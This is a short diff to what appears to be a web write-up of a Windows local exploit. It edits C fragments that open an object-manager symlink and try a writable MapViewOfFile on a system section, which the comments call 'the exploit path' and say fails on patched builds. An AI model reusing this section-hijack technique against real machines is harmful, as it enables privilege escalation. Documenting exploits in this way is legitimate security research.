@@ -579,7 +579,6 @@ if (stat == 0xC0000035) {
         printf("[+] Existing symlink opened successfully\n");
     } else {
         printf("[!] Failed to open existing symlink: 0x%08X\n", openStat);
-        printf("=> Try rebooting to clean up the dangling namespace entry\n");
         free(dllData);
         return 1;
     }
@@ -634,7 +633,7 @@ if (!hSystemSection) {
   <div class="code-block">
     <div class="code-label">write attempt then read-only fallback : both error codes preserved</div>
     <pre><span style="color:#52525b">// First attempt: WRITE access (the exploit path).</span>
-<span style="color:#52525b">// On patched builds this returns 0xC0000022 .. WRITE access => ça marche pas !</span>
+<span style="color:#52525b">// On patched builds this returns 0xC0000022 .. WRITE access -> ça marche pas !</span>
 void* pMapped = MapViewOfFile(hSystemSection, FILE_MAP_WRITE, 0, 0, 0);
 
 if (!pMapped) {
